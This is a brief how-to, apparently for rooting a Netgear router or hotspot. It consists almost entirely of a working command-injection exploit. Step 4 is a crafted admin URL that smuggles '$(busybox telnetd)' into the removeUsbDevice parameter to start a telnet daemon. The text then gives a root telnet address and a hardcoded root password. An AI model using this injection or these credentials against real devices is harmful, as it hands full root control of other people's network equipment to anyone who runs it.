* 1. Login to the administrative page (http//192.168.1.1, by default)
* 2. Navigate to http://192.168.1.1/js/NetgearStrings.js
* 3. Search for `secToken` and copy its value
* 4. Place your secToken at the end of the equals sign and run the injection command in your browser:
`http://192.168.1.1/Forms/config?ready.deviceShare.removeUsbDevice=%3B%24(busybox%20telnetd)%3B&err_redirect=/error.json&ok_redirect=/success.json&token=`. 
* 5. The root shell is exposed via telnet (192.168.9.9:23)

Username is root

Password is oelinux123
